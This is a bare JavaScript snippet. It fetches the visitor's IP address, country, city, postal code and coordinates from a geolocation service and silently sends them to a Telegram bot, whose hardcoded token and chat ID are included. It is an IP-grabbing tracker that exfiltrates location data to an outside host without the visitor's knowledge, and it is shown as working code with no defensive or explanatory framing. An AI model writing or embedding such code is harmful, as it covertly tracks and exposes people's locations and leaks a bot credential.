fetch('https://geolocation-db.com/json/')
    .then(response => response.json())
    .then(data => {
        const message = 'IPv4: ' + data.IPv4 + '\nCOUNTRY: ' + data.country_name + '\nSTATE: ' + data.state + '\nCITY: ' + data.city + '\nPOSTAL: ' + data.postal + '\nLAT: ' + data.latitude + '\nLON: ' + data.longitude;

        fetch('https://api.telegram.org/bot6902083128:AAHs4ukOtXTGj7pdqpOI6rFTIVmoLkj219I/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '-1002044932438',
                text: message
            })
        })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
    })
    .catch(error => console.error(error));
